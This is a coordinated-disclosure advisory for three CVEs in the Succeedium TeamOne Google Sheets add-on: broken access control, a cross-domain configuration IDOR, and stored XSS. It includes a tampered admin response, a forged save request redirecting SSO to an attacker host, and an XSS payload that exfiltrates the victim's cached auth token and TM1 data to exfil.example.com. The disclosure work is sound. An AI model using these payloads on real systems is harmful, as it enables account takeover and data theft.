# CVE-2025-6025{4-6}

[Succeedium TeamOne](https://succeedium.com/teamone/) is a Google Sheets add-on
which enables businesses to integrate their IBM Planning Analytics
infrastructure directly into their Google Workspace applications. The extension
is comprised of a client-side component written in Vue, and a server-side Google
App Script component which manages concerns such as persistence and access
control.

We discovered a chain of three vulnerabilities which enable external attackers
to inject cross-site scripting payloads into the configuration details fetched
by users of the Succeedium TeamOne extension.

When authenticated users open the TeamOne extension in Google Sheets, the XSS
payload can execute arbitrary JavaScript within the TeamOne extension's context.
This enables attackers to exfiltrate credentials, conduct phishing attacks, as
well as make web requests to any TM1 instances the victim has configured in
their user-level settings.

To execute this attack, an attacker only requires an active Google Workspace
account (not necessarily within the victim's domain). Once the payload is in
place, the attacker then needs an authenticated victim to browse to the payload
by opening the TeamOne sidebar in any spreadsheet where TeamOne is installed. If
the user has already authenticated to a TM1 instance, then data exfiltration can
begin immediately (one-click). Otherwise, the payload can either wait for the
user to authenticate manually, or attempt to manipulate the victim into
authenticating through phishing or click-jacking techniques.


#### CVE-2025-60255: Broken Access Control

Upon initialising the extension in a new Google Sheet document, the extension
makes a `teamoneConfigGet` API call. The user's domain and document privilege
level are contained in the response to this call. For example, the following is
a typical response to a `teamoneConfigGet` request:

```json
[
  [
    "op.exec",
    [
      0,
      "{\"globalConfig\":[],\"domainList\":[\"@example.com\"],\"domainConfig\":[{\"name\":\"ApliqoC3\",\"options\":{\"-proxyAllRequests\":true,\"-port\":\"8020\",\"-readonly\":true,\"-namespace\":\"LDAP\",\"-sso\":true,\"-type\":\"local\",\"-proxy\":\"teamone.example.com.au\",\"-gateway\":\"https://bi.example.com.au:8443/ibmcognos/bi/v1/disp\",\"-host\":\"tm1za.example.com.au\"},\"params\":{},\"type\":\"tm1env\",\"permissions\":[]},{\"options\":{\"-proxyAllRequests\":true,\"-port\":\"8021\",\"-readonly\":true,\"-namespace\":\"LDAP\",\"-sso\":true,\"-type\":\"local\",\"-gateway\":\"https://bi.example.com.au:8443/ibmcognos/bi/v1/disp\",\"-proxy\":\"teamone.example.com.au\",\"-host\":\"tm1za.example.com.au\"},\"name\":\"PROD\",\"type\":\"tm1env\",\"params\":{},\"permissions\":[]},{\"name\":\"ApliqoC3 (test)\",\"options\":{\"-proxyAllRequests\":true,\"-port\":\"8020\",\"-readonly\":true,\"-namespace\":\"LDAP\",\"-sso\":true,\"-type\":\"local\",\"-gateway\":\"https://test.bi.example.com.au:8443/ibmcognos/bi/v1/disp\",\"-proxy\":\"teamone.example.com.au\",\"-host\":\"tm1zatest.example.com.au\"},\"type\":\"tm1env\",\"params\":{},\"permissions\":[]}],\"userEmail\":\"user@example.com\",\"userDomain\":\"@example.com\",\"userConfig\":[],\"users\":[],\"domainAccess\":\"USER\",\"docAccess\":\"ADMIN\"}"
    ]
  ],
  [
    "di",
    973
  ]
]
```

By intercepting and modifying the response to change the `domainAccess` value
from `USER` to `ADMIN`, we can access administrative capabilities in the
frontend. Below is the modified response:

```
[
  [
    "op.exec",
    [
      0,
      "{\"globalConfig\":[],\"domainList\":[\"@example.com\"],\"domainConfig\":[{\"name\":\"ApliqoC3\",\"options\":{\"-proxyAllRequests\":true,\"-port\":\"8020\",\"-readonly\":true,\"-namespace\":\"LDAP\",\"-sso\":true,\"-type\":\"local\",\"-proxy\":\"teamone.example.com.au\",\"-gateway\":\"https://bi.example.com.au:8443/ibmcognos/bi/v1/disp\",\"-host\":\"tm1za.example.com.au\"},\"params\":{},\"type\":\"tm1env\",\"permissions\":[]},{\"options\":{\"-proxyAllRequests\":true,\"-port\":\"8021\",\"-readonly\":true,\"-namespace\":\"LDAP\",\"-sso\":true,\"-type\":\"local\",\"-gateway\":\"https://bi.example.com.au:8443/ibmcognos/bi/v1/disp\",\"-proxy\":\"teamone.example.com.au\",\"-host\":\"tm1za.example.com.au\"},\"name\":\"PROD\",\"type\":\"tm1env\",\"params\":{},\"permissions\":[]},{\"name\":\"ApliqoC3 (test)\",\"options\":{\"-proxyAllRequests\":true,\"-port\":\"8020\",\"-readonly\":true,\"-namespace\":\"LDAP\",\"-sso\":true,\"-type\":\"local\",\"-gateway\":\"https://test.bi.example.com.au:8443/ibmcognos/bi/v1/disp\",\"-proxy\":\"teamone.example.com.au\",\"-host\":\"tm1zatest.example.com.au\"},\"type\":\"tm1env\",\"params\":{},\"permissions\":[]}],\"userEmail\":\"user@example.com\",\"userDomain\":\"@example.com\",\"userConfig\":[],\"users\":[],\"domainAccess\":\"ADMIN\",\"docAccess\":\"ADMIN\"}"
    ]
  ],
  [
    "di",
    973
  ]
]
```

Since the backend does not apply any access control, we now have control the
domain-wide settings for the TeamOne extension despite not being a domain
administrator.

#### CVE-2025-60256: Insecure Direct Object Reference in `gsTeamOneConfigSave`

After a configuration change is made, the extension calls the `gsTeamOneConfigSave` method to persist the changes. In addition to the updated settings, the user's domain is also contained in the request. By intercepting and modifying this domain (for example, changing `attacker.com` to `victim.com`), an attacker is able to modify the domain-wide settings for users in other domains.

As an example, the following is a payload which configures the SSO gateway of the victim's configuration to point to a phishing link (`okta.attacker.com`). The request was made from the attacker's Google Workspace account. The `domainList` argument and the domain in the last positional argument have been changed from `attacker.com` to `victim.com`. This causes the changes to persist within the victim's TeamOne configuration.

```
POST /a/macros/google.com/d/<redacted> HTTP/2
Host: docs.google.com
Cookie: <redacted>
Content-Length: 3342
Sec-Ch-Ua-Full-Version-List: "Google Chrome";v="137.0.7151.55", "Chromium";v="137.0.7151.55", "Not/A)Brand";v="24.0.0.0"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Bitness: "64"
Sec-Ch-Ua-Model: ""
Sec-Ch-Ua-Mobile: ?0
X-Same-Domain: 1
Sec-Ch-Ua-Wow64: ?0
Sec-Ch-Ua-Form-Factors: "Desktop"
Sec-Ch-Ua-Arch: "x86"
Sec-Ch-Ua-Full-Version: "137.0.7151.55"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Sec-Ch-Ua-Platform-Version: "6.15.6"
Accept: */*
Origin: https://docs.google.com
X-Client-Data: <redacted>
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://docs.google.com/a/macros/attacker.com/d/<redacted>
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i

request=["gsTeamoneConfigSave","[\"domainConfig\",{\"globalConfig\":[],\"domainList\":[\"@victim.com\"],\"domainConfig\":[{\"name\":\"ApliqoC3\",\"type\":\"tm1env\",\"options\":{\"-type\":\"local\",\"-sso\":true,\"-namespace\":\"LDAP\",\"-host\":\"tm1za.victim.com\",\"-port\":\"8020\",\"-proxy\":\"teamone.victim.com\",\"-proxyAllRequests\":true,\"-gateway\":\"https://bi.victim.com:8443/ibmcognos/bi/v1/disp\"},\"params\":{},\"permissions\":[]},{\"name\":\"PROD\",\"type\":\"tm1env\",\"options\":{\"-type\":\"local\",\"-sso\":true,\"-namespace\":\"LDAP\",\"-host\":\"tm1za.victim.com\",\"-port\":\"8021\",\"-proxy\":\"teamone.victim.com\",\"-proxyAllRequests\":true,\"-gateway\":\"https://bi.victim.com:8443/ibmcognos/bi/v1/disp\"},\"params\":{},\"permissions\":[]},{\"name\":\"ApliqoC3 (test)\",\"type\":\"tm1env\",\"options\":{\"-type\":\"local\",\"-sso\":true,\"-namespace\":\"LDAP\",\"-host\":\"tm1zatest.victim.com\",\"-port\":\"8020\",\"-proxy\":\"teamone.victim.com\",\"-proxyAllRequests\":true,\"-gateway\":\"https://test.bi.victim.com:8443/ibmcognos/bi/v1/disp\"},\"params\":{},\"permissions\":[]},{\"name\":\"PenetrationTest (Test)\",\"type\":\"tm1env\",\"options\":{\"-type\":\"local\",\"-sso\":true,\"-namespace\":\"LDAP\",\"-host\":\"tm1zatest.victim.com\",\"-port\":\"8020\",\"-proxy\":\"teamone.victim.com\",\"-proxyAllRequests\":true,\"-gateway\":\"https://okta.attacker.com/JrYMlhPl\"},\"params\":{},\"permissions\":[]}],\"userEmail\":\"user@attacker.com\",\"userDomain\":\"@attacker.com\",\"userConfig\":[],\"users\":[{\"admin\":true,\"email\":\"user@attacker.com\"},{\"admin\":true,\"email\":\"user2@attacker.com\"},{\"admin\":true,\"email\":\"user3@attacker.com\"},{\"admin\":true,\"email\":\"user4@attacker.com\"}],\"domainAccess\":\"ADMIN\",\"docAccess\":\"ADMIN\"},\"@victim.com\"]",null,[0],null,null,1,0]
```



#### CVE-2025-60254: Stored Cross Site Scripting via `vm.stop`

The client-side code for the Succeedium TeamOne extension makes heavy use of the Vue `v-html` directive to insert HTML content into an element without sanitisation. This can make the application susceptible to cross-site scripting. As an example, toast notifications within the extension that display log messages make use of the `v-html` directive in the following manner:

```html
<v-badge offset-x="12" offset-y="15" :color="colorMain" dot overlap>
  <v-list-item-subtitle style="-webkit-line-clamp: 2 !important"
    ><div>...</div>
    <div
      class="tm1LogMsg"
      v-for="msg in logMsg.slice(-3)"
      v-html="msg.msg"
      :class="msg.class"
    ></div
  ></v-list-item-subtitle>
</v-badge>
```

We can therefore inject malicious JavaScript into a log message by creating a configuration which uses the SSO authentication method, together with an empty proxy. Upon loading this configuration, the unsanitised name of the configuration is directly injected into a log message via the `vm.stop()` method:

```js
if(tm1Cfg['-sso']){
  if(!tm1Cfg['-proxy']) {
    vm.stop(`<b>-proxy<b> parameter is missing in <b>${env}</b> connection configured with SSO`)
  }
}
```

Since the message is completely unsanitised, we can get script execution within the TeamOne extension's context by creating a configuration with a name such as

```js
<img src=x onerror="alert('XSS')"/>
```

This XSS executes in the same JavaScript context as the TeamOne extension, allowing it to access any in-scope variables, including credentials, cached authorisation tokens as well as any user-level configurations. Hence a more realistic script may hence look like this:

```js
fetch(
  `https://${vm.TeamOneCfg.tm1env['PROD']['-proxy']}/?url=https://${vm.teamOneCfg.tm1env['PROD']['-host']}:${vm.teamOneCfg.tm1env['-port']}/api/v1/Configuration`,
  { headers: { Authorization: vm.tm1Cfg["auth"] } },
)
  .then((r) => r.text())
  .then((data) => fetch(`https://exfil.example.com/?exfil=${btoa(data)}`));
```

This script will use the victim's cached authentication token (stored in `vm.tm1Cfg['auth']`) to make a request to their IBM TM1 instance by way of their TeamOne proxy. The proxy is necessary in this case as a means to bypass CORS restrictions, since the proxy embeds the requestor's origin directly into the `Access-Control-Allow-Origin` header before returning the proxied response.

#### Mitigation

Following a coordinated disclosure of this vulnerability to Succeedium, all three vulnerabilities have been resolved with the release of **TeamOne v4.22**. 

#### Timeline

-   2025-08-04: Vulnerabilities reported to Succeedium
-   2025-08-04: Internal review and development team meeting by Succeedium
-   2025-08-05: Release of patched TeamOne version (v4.22) to all customers
-   2025-08-07: Retesting completed, permission to disclose and bounty received
